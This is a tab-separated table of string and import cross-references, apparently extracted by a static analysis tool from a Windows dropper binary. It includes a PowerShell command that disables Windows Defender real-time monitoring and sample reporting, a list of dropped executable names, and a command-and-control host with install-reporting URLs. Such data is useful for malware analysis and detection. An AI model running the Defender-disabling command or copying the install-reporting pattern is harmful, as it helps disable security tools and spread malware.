reference_vaddr	symbol_addr	symbol_type	caller_function	data
0x40118b	0x4e82fc	import	0x40115c	KERNEL32.dll.Sleep
0x401223	0x4e82f8	import	0x40115c	KERNEL32.dll.SetUnhandledExceptionFilter
0x401433	0x4e82d4	import	0x40115c	KERNEL32.dll.GetStartupInfoA
0x4014e9	0x4a2000	string	0x4014e0	libgcc_s_dw2-1.dll
0x4014f0	0x4e82c8	import	0x4014e0	KERNEL32.dll.GetModuleHandleA
0x4014ff	0x4a2000	string	0x4014e0	libgcc_s_dw2-1.dll
0x401506	0x4e82ec	import	0x4014e0	KERNEL32.dll.LoadLibraryA
0x40150c	0x4e82d0	import	0x4014e0	KERNEL32.dll.GetProcAddress
0x40151a	0x4a2013	string	0x4014e0	__register_frame_info
0x40152c	0x4a2029	string	0x4014e0	__deregister_frame_info
0x4015b4	0x4e82b4	import	0x401590	KERNEL32.dll.FreeLibrary
0x401682	0x4a2050	string	0x401669	ConsoleWindowClass
0x4016a8	0x4a2063	string	0x401669	TEMP
0x4016b7	0x4a2068	string	0x401669	username
0x4016e3	0x4a2074	string	0x401669	powershell -inputformat none -outputformat none -NonInteractive -Command Set-MpPreference -DisableRealtimeMonitoring $true -SubmitSamplesConsent NeverSend -MAPSReporting Disable
0x401740	0x4a2128	string	0x401669	61f665277addf_Sun10a8a309b91.exe
0x4017b6	0x4a214c	string	0x401669	61f66527ccfd9_Sun1015e545d047.exe
0x40182c	0x4a216e	string	0x401669	61f66529e6cd2_Sun105c44b0.exe
0x4018a2	0x4a218c	string	0x401669	61f6652d6cc6c_Sun1044a3cb.exe
0x401918	0x4a21aa	string	0x401669	61f6652e754de_Sun109ac46a.exe
0x40198e	0x4a21c8	string	0x401669	61f6652f39632_Sun10026c4ad66e.exe
0x401a04	0x4a21ec	string	0x401669	61f665303c295_Sun1059d492746c.exe
0x401a7a	0x4a2210	string	0x401669	61f66531d983b_Sun107214d929.exe
0x401af0	0x4a2230	string	0x401669	61f66533d4eda_Sun1071c91f5429.exe
0x401b66	0x4a2254	string	0x401669	61f665342d79b_Sun1042dc8bfdc5.exe
0x401bdc	0x4a2278	string	0x401669	61f6653619f90_Sun10969c0a197.exe
0x401c52	0x4a229c	string	0x401669	61f665380801f_Sun10f257ccc.exe
0x401cc8	0x4a22bc	string	0x401669	61f66539e050d_Sun103349fe7f.exe
0x401d03	0x4a22dc	string	0x401669	/mixtwo
0x401d3e	0x4a22e5	string	0x401669	61f6653a993c0_Sun10a84012.exe
0x401e14	0x4a2303	string	0x401669	&oname[]=pri
0x401ecc	0x4a2310	string	0x401669	&oname[]=lli
0x401f84	0x4a231d	string	0x401669	&oname[]=pet
0x40203c	0x4a232a	string	0x401669	&oname[]=ask
0x4020f4	0x4a2337	string	0x401669	&oname[]=cry
0x4021ac	0x4a2344	string	0x401669	&oname[]=Pat
0x402264	0x4a2351	string	0x401669	&oname[]=kee
0x40231c	0x4a235e	string	0x401669	&oname[]=pyi
0x4023d4	0x4a236b	string	0x401669	&oname[]=pc
0x40248c	0x4a2378	string	0x401669	&oname[]=kur
0x402544	0x4a2385	string	0x401669	&oname[]=lih
0x4025fc	0x4a2392	string	0x401669	&oname[]=Der
0x4026b4	0x4a239f	string	0x401669	&oname[]=GCl
0x40276c	0x4a23ac	string	0x401669	&oname[]=dir
0x4027e3	0x4a23b9	string	0x401669	&oname[]=
0x402822	0x4a23c3	string	0x401669	&cnt=
0x4028ee	0x4a23cc	string	0x401669	report_error.php?key=125478824515ADNxu2ccbwe&msg=No-Exes-Found-To-Run
0x403249	0x4a243e	string	0x403204	http://hornygl.xyz/
0x403278	0x4a2452	string	0x403204	myip.php
0x4032a1	0x4a245c	string	0x403204	addInstall.php?key=125478824515ADNxu2ccbwe&ip=&oid=155&megid=834023847234798234Bkh234JgkAUGWELj3493LJhgdfyug43kjGGsurkeyxbbyrLLh3245533
0x4032d6	0x4a24e4	string	0x403204	&oname[]=30Jan1015AM_15JAN_UPD
0x403857	0x4a3dc9	string	0x40335f	(anonymous namespace)
0x404ba8	0x4a3f22	string	0x40335f	string literal
0x405271	0x4a3f3a	string	0x40335f	decltype(auto)
0x40540a	0x4a3f35	string	0x40335f	auto
0x406a1d	0x4a42f0	string	0x40335f	[abi:
0x4081bc	0x4a4318	string	0x40335f	auto:
0x40881a	0x4a4431	string	0x40335f	for
0x4089ff	0x4a434c	string	0x40335f	-in-
0x40926e	0x4a44f7	string	0x40335f	this
0x4098a4	0x4a447b	string	0x40335f	_Sat
0x409c09	0x4a44cd	string	0x40335f	true
0x40a029	0x4a42f9	string	0x40335f	{default arg#
0x40a84c	0x4a430e	string	0x40335f	JArray
0x40a9de	0x4a44b8	string	0x40335f	new
0x40acb9	0x4a44c7	string	0x40335f	false
0x40c43c	0x4a4850	string	0x40335f	...)
0x40c77b	0x4a3dc0	string	0x40c750	_GLOBAL_
0x40cf20	0x4e832c	import	0x40c750	msvcrt.dll.__lconv_init
0x40cf79	0x4e82d8	import	0x40c750	KERNEL32.dll.GetSystemTimeAsFileTime
0x40cf8a	0x4e82bc	import	0x40c750	KERNEL32.dll.GetCurrentProcessId
0x40cf92	0x4e82c0	import	0x40c750	KERNEL32.dll.GetCurrentThreadId
0x40cf9a	0x4e82dc	import	0x40c750	KERNEL32.dll.GetTickCount
0x40cfa9	0x4e82f4	import	0x40c750	KERNEL32.dll.QueryPerformanceCounter
0x40d03f	0x4e82f8	import	0x40cff0	KERNEL32.dll.SetUnhandledExceptionFilter
0x40d04f	0x4e8308	import	0x40cff0	KERNEL32.dll.UnhandledExceptionFilter
